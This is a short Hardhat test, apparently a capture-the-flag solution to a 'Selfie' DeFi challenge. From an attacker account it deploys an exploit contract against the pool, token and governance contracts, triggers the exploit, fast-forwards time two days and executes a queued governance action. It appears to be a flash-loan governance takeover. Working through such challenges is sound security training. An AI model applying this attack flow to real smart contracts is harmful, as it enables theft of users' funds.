...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        Exploit = await ethers.getContractFactory('SelfieExploit', attacker);
        exploit = await Exploit.deploy(this.pool.address, this.token.address, this.governance.address);
        await exploit.deployed();
        tx = await exploit.exploit()
        await tx.wait();
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
        tx = await this.governance.connect(attacker).executeAction(1);
        await tx.wait();
    });
